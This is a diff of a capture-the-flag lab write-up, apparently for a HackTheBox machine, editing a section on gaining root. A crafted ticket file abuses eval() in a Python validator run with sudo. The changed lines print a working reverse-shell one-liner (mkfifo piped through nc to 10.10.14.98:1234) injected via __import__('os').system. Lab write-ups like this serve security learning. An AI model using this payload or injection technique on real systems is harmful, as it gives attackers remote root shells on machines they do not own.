@@ -77,7 +77,8 @@ main()
 sign gives remainder of `4` when divided by `7` to check if ticket code is valid.
 * Then it evaluates the expression after stripping of all `**` and see if its total is greater than 100 to check if ticket is valid using `eval()` function.
 ## Exploiting `eval()` function to get reverse shell as root
-First of all a file with `.md` extention was made satisfying all conditions of valid ticket in `/tmp/clarkey` directory named `a.md` which contained reverse shell code `__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.98 1234 >/tmp/f')` in statement that will evaluate using evail()
+First of all a file with `.md` extention was made satisfying all conditions of valid ticket in `/tmp/clarkey` directory named `a.md` which contained reverse shell code `__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.98 1234 >/tmp/f')` in statement that will evaluate using `eval()` function in
+`ticketValidator.py` file. Contents of `/tmp/clarkey/a.md` are as follows.
 ```bash
 development@bountyhunter:/opt/skytrain_inc$ cat /tmp/clarkey/a.md
 # Skytrain Inc# Skytrain Inc
@@ -87,7 +88,9 @@ __Ticket Code:__
 ##Issued: 2021/04/06
 #End Ticket
 ```
-Now running command `/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py` as sudo to get reverse shell 
+Now running command `/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py` as sudo to get reverse shell.
+![[Pasted image 20210916170813.png]]
+
 
 
 
